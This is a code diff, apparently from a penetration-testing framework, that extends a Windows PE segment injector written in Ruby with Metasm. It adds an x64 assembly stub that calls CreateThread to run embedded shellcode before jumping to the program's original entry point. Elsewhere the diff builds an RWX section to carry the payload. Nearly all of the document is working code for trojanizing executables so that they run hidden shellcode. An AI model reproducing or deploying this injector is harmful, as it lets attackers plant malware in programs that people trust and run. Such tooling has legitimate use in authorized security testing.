@@ -27,10 +27,50 @@ module Exe
         return Metasm::Ia32.new
       when :x64
         return Metasm::X86_64.new
+      else
+        raise "Incompatible architecture"
       end
     end
 
     def create_thread_stub
+      case @arch
+      when :x86
+        create_thread_stub_x86
+      when :x64
+        create_thread_stub_x64
+      else
+        raise "Incompatible architecture"
+      end
+    end
+
+    def create_thread_stub_x64
+      <<-EOS
+        mov rcx, hook_libname
+        call [iat_LoadLibraryA]
+        mov rdx, hook_funcname
+        mov rcx, rax
+        call [iat_GetProcAddress]
+        push 0
+        push 0
+        mov r9, 0
+        lea r8, [thread_hook]
+        mov rdx, 0
+        mov rcx, 0
+        call rax
+
+        jmp entrypoint
+
+        hook_libname db 'kernel32', 0
+        hook_funcname db 'CreateThread', 0
+
+        thread_hook:
+        lea #{buffer_register}, [shellcode]
+        shellcode:
+      EOS
+    end
+
+
+    def create_thread_stub_x86
       <<-EOS
         pushad
         push hook_libname
@@ -73,10 +113,9 @@ module Exe
       # .text:004136BC                 sar     ecx, 1
       # .text:004136BE                 mov     eax, [eax+0Ch]
       # .text:004136C1                 add     eax, 0Ch
-      pattern = /\x64\xA1\x30\x00\x00\x00\x2B\xCA\xD1\xF9\x8B\x40\x0C\x83\xC0\x0C/
-      sections = {}
-      pe.sections.each {|s| sections[s.name.to_s] = s}
-      if sections['.text'].encoded.pattern_scan(pattern).blank?
+      pattern = "\x64\xA1\x30\x00\x00\x00\x2B\xCA\xD1\xF9\x8B\x40\x0C\x83\xC0\x0C"
+      section = pe.sections.find { |s| s.name.to_s == '.text' }
+      if section && section.encoded.pattern_scan(pattern).blank?
         return false
       end
 
@@ -120,7 +159,7 @@ entrypoint:
       # Generate a new code section set to RWX with our payload in it
       s = Metasm::PE::Section.new
       s.name = '.text'
-      s.encoded = payload_stub prefix
+      s.encoded = payload_stub(prefix)
       s.characteristics = %w[MEM_READ MEM_WRITE MEM_EXECUTE]
 
       # Tell our section where the original entrypoint was
